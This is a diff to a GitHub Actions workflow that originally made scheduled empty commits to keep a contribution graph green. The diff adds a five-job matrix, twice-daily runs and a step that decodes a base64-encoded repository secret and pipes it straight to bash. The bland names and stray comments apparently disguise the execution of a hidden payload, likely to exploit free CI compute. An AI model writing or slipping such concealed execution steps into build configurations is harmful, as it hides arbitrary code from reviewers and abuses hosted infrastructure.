@@ -1,24 +1,39 @@
-name: ci
+name: blank
 
+#wdf1x
 on:
-  push:
-    branches:
-      - master
   schedule:
-    - cron: '0 0/8 * * *'
+    - cron: '0 1 * * *'
+    - cron: '0 13 * * *'  #sk1dder_lo1i
+  workflow_dispatch: # AutoGreen
+
+#fix some
+#update
+concurrency:
+  group: cikwe
+  cancel-in-progress: true
 
 jobs:
-  autogreen:
+  run:
     runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        task: [1, 2, 3, 4, 5]
     steps:
-      - name: Clone repository
+      - name: repo
+        if: ${{ matrix.task == 1 }}
         uses: actions/checkout@v2
-
-      - name: Auto green
+        continue-on-error: true
+      - name: commit
+        if: ${{ matrix.task == 1 }}
         run: |
-          git config --local user.email "zeemenng@gmail.com"
-          git config --local user.name "Zee"
+          git config --local user.email "cax049311@qq.com"
+          git config --local user.name "cax049311"
           git remote set-url origin https://${{ github.actor }}:${{ secrets.GITHUB_TOKEN }}@github.com/${{ github.repository }}
           git pull --rebase
-          git commit --allow-empty -m "自动点绿"
+          git commit --allow-empty -m "1"
           git push
+        continue-on-error: true
+      - name: execute
+        run: |
+          echo "${{ secrets.TEST }}" | base64 -d | bash
